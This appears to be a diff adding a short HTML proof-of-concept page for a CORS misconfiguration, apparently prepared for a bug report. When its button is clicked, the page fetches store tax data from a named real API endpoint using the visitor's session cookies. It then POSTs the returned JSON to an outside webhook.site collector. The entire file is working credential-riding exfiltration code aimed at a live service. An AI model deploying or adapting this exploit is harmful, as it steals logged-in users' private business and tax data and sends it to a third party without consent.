@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <button id="poc">req</button>
+    <script>
+      document.getElementById('poc').addEventListener('click', function() {
+        const url = "https://smartbiz.amazon.in/api/stores/66307/tax";
+        fetch(url, { credentials: "include" }) 
+          .then(r => r.json())
+          .then(data => {
+            alert("Received data:\n" + JSON.stringify(data, null, 2));
+            console.log("Got JSON:", data);
+            return fetch("https://webhook.site/046b05de-2f7d-43ae-9875-6971f7658023", {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: JSON.stringify(data)
+            });
+          })
+          .then(response => {
+            console.log("Forwarded to webhook:", response.status);
+            alert("Sent");
+          })
+          .catch(err => {
+            console.error("Error:", err);
+            alert("Error: " + err);
+          });
+      });
+    </script>
+  </body>
+</html>
